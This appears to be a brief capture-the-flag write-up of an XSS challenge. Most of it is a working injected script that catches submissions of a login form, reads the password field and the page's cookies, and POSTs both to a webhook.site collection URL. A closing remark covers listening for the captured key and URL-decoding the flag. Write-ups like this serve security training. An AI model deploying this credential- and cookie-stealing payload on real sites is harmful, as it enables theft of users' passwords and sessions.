XSS vulnerability

```html
<script>
document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("authForm").addEventListener("submit", () => {
        const key = document.getElementById("authPassword").value; 
        fetch("//webhook.site/35ba567d-a7f8-402d-9a9d-e9803698e06c", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                key: key,
                blarg: document.cookie
            })
        });
    })
});
</script>
```

After that, listen to the incomming requests to get the key.

Encoding was somehow now working correctly right away testing with `decodeURIComponent("jeg!Har%Mest&LystTil&At%V%C3%A6re-En-Hacker")` returned an error.
It turns out the "Æ" here was encoded, giving us the final answer of `jeg!Har%Mest&LystTil&At%Være-En-Hacker`
